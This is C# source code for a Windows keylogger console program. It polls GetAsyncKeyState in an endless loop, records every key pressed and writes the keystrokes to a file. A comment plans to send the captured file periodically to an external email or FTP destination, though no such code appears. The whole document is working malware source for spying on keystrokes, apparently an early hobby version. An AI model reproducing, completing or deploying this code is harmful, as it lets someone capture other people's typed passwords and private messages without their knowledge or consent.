using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

namespace KeyLogger
{
    internal class Program
    {

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        private static string keyStrokeFilePath = "";

        static void Main(string[] args)
        {
            Console.WriteLine("Key Logger!\n");

            // Plan
            // 2 - store the strokes into a text file
            // 3 - periodically send the content of the file to external resource (email or FTP)

            keyStrokeFilePath = FileIo.CreateDirectoryAndFile();
            while (true)
            {
                // pause anf let other programs get a chance to run 
                Thread.Sleep(200);
                storePressedKey(Detect_pressed_key());
            }

        }

        /// capture keystrokes and display them on the console
        public static string Detect_pressed_key()
        {
            // check all keys for their state
            var result = "";
            for (int i = 0; i < 127; i++)
            {
                int keyState = GetAsyncKeyState(i);
                if (keyState != 0)
                {
                    if (i == 13) result += " NewLine \n";
                    else if (i == 8) result += "  Backspace  ";
                    else if (i == 17) result += "  ctrl  ";
                    else if (i == 16) result += "  Shift  ";
                    else if (i == 18) result += "  Alt  ";
                    else if (i == 46) result += "  DEL  ";
                    if (i > 27 && i < 127) result += (char)i + " ";
                }
            }

            return result;
        }

        public static void storePressedKey(String result)
        {
            if (!string.IsNullOrEmpty(result))
            {
                Console.Write(result);
                FileIo.WriteStrokeInFile(result, keyStrokeFilePath);
            }
        }
    }
}
